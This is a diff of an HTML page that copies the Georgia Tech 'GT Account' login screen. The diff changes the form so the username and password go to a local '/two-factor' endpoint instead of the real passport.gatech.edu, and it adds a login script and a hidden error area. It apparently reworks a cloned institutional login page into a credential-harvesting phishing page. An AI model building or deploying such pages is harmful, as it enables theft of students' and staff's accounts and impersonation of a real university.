@@ -16,7 +16,10 @@
     <link rel="stylesheet" type="text/css" href="/styles/legacy.css?1565965287">
     <![endif]-->
 
-    <script async="" src="./public/analytics.js"></script><script src="./public/modernizr.js"></script>
+    <script async="" src="./public/analytics.js"></script>
+    <script src="./public/modernizr.js"></script>
+    
+
       <meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large">
       <meta class="foundation-mq-medium"><meta class="foundation-mq-small"><style></style><meta class="foundation-mq-topbar"></head>
 
@@ -60,7 +63,8 @@
   
   <div id="login_box" class="focus_input">
     <h2>Enter your GT Account and Password</h2>
-        <div class="gt_form"><form enctype="application/x-www-form-urlencoded" action="https://passport.gatech.edu/" method="post"><input type="hidden" name="csrf_token" value="Mjg0Mzc3MTQyMg==">
+      <div class="errors" hidden></div>
+        <div class="gt_form"><form enctype="application/x-www-form-urlencoded" action="/two-factor" method="post"><input type="hidden" name="csrf_token" value="Mjg0Mzc3MTQyMg==">
 <ul class="fields"><li class="field"><label for="username" class="optional">GT Account</label>
 
 <input type="text" name="username" id="username" value="" autocorrect="off" autocapitalize="off"></li>
@@ -110,6 +114,7 @@
           </footer>
 
   <script type="text/javascript" src="./public/jquery"></script>
+  <script async="" src="./public/cas_login.js"></script>
   <!--[if gt IE 8]><!-->
     <script type="text/javascript" src="./public/foundation"></script>
   <!--<![endif]-->
